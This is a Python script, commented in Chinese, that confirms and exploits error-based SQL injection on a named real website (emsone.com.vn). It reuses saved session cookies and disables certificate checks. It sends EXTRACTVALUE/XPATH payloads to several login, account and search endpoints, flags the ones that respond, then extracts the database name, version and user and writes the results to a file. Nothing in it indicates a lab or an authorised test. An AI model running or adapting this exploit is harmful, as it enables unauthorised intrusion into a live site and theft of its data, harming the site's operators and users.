#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class VerifyRealSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.real_sqli = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def verify_endpoint(self, endpoint, param):
        """验证端点是否真的存在SQL注入"""
        # 1. 正常请求
        normal_url = f"{self.base_url}{endpoint}?{param}=1"
        try:
            r_normal = self.session.get(normal_url, timeout=5)
            normal_len = len(r_normal.text)
            normal_status = r_normal.status_code
        except:
            return None
        
        # 2. 注入测试
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        sqli_url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        
        try:
            start = time.time()
            r_sqli = self.session.get(sqli_url, timeout=15)
            elapsed = time.time() - start
            sqli_len = len(r_sqli.text)
            sqli_status = r_sqli.status_code
            
            # 检查真实注入特征
            has_test = 'TEST' in r_sqli.text
            has_xpath = 'XPATH' in r_sqli.text.upper()
            has_delay = elapsed > 4
            len_diff = abs(sqli_len - normal_len)
            
            # 只有真正有注入特征才认为有效
            if has_test or (has_xpath and len_diff > 100) or has_delay:
                result = {
                    'endpoint': endpoint,
                    'param': param,
                    'normal_status': normal_status,
                    'sqli_status': sqli_status,
                    'normal_len': normal_len,
                    'sqli_len': sqli_len,
                    'len_diff': len_diff,
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed
                }
                
                if has_xpath:
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r_sqli.text, re.IGNORECASE)
                    if match:
                        result['extracted'] = match.group(1)
                
                return result
        except:
            pass
        
        return None
    
    def extract_database(self, endpoint, param):
        """从已验证端点提取数据库"""
        print(f"\n[*] 提取数据库: {endpoint} [{param}]")
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
            ('SELECT @@version', 'MySQL版本'),
        ]
        
        extracted = {}
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                
                patterns = [
                    r"XPATH syntax error: '~([^']+)~'",
                    r"'~([^']+)~'",
                    r"~([^~]+)~",
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        value = match.group(1)
                        if value and len(value) > 0 and value != 'TEST':
                            print(f"    [+] {label}: {value}")
                            extracted[label] = value
                            break
            except:
                pass
        
        return extracted
    
    def run_all(self):
        """执行所有验证"""
        print("="*60)
        print("验证真实SQL注入")
        print("="*60)
        
        # 测试所有可能的端点
        endpoints_config = [
            ('/Account/GetUserInfo', ['id']),
            ('/Handle/SearchListProvince', ['Type', 'id']),
            ('/Handle/SearchListWardByDistrictID', ['DistrictID', 'id']),
            ('/Handle/SearchListDistrictByProvinceID', ['ProvinceID', 'id']),
            ('/Handle/SearchListCustomer', ['q', 'id', 'search']),
            ('/Account/JLogin', ['id', 'MobileNumber']),
        ]
        
        verified = []
        for endpoint, params in endpoints_config:
            for param in params:
                result = self.verify_endpoint(endpoint, param)
                if result:
                    print(f"\n[!] 真实注入: {endpoint} [{param}]")
                    print(f"    正常: {result['normal_status']}, {result['normal_len']} bytes")
                    print(f"    注入: {result['sqli_status']}, {result['sqli_len']} bytes")
                    print(f"    差异: {result['len_diff']} bytes")
                    if result.get('extracted'):
                        print(f"    提取: {result['extracted']}")
                    verified.append(result)
                    
                    # 尝试提取数据库
                    if result.get('has_xpath'):
                        extracted = self.extract_database(endpoint, param)
                        result['db_extracted'] = extracted
        
        # 保存结果
        with open('verified_real_sqli.json', 'w', encoding='utf-8') as f:
            json.dump(verified, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("验证结果")
        print("="*60)
        print(f"真实注入点: {len(verified)}")
        for v in verified:
            print(f"  {v['endpoint']} [{v['param']}]")
            if v.get('db_extracted'):
                for k, val in v['db_extracted'].items():
                    print(f"    {k}: {val}")

if __name__ == "__main__":
    scanner = VerifyRealSQLi()
    scanner.run_all()